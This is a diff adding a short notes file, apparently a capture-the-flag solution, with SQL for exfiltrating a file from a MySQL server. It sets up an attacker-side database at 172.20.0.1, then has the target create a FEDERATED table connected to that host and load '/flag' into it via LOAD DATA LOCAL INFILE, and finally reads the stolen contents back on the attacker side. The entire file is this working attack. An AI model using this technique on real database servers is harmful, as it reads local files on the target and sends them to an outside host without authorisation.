@@ -1,0 +1,16 @@
+attacker ip (reachable from sql server): 172.20.0.1
+
+---- attacker mysql
+
+CREATE USER 'testuser'@'%';
+CREATE DATABASE soltest;
+GRANT ALL ON soltest.* to 'testuser'@'%' IDENTIFIED BY 'testpass';
+use soltest;
+CREATE TABLE test (flag TEXT);
+
+---- send to server
+CREATE TEMPORARY TABLE random.garbo (flag TEXT) ENGINE=FEDERATED CONNECTION='mysql://testuser:testpass@172.20.0.1:3306/soltest/test';
+LOAD DATA LOCAL INFILE '/flag' INTO TABLE random.garbo;
+
+---- attacker mysql
+SELECT * from test;
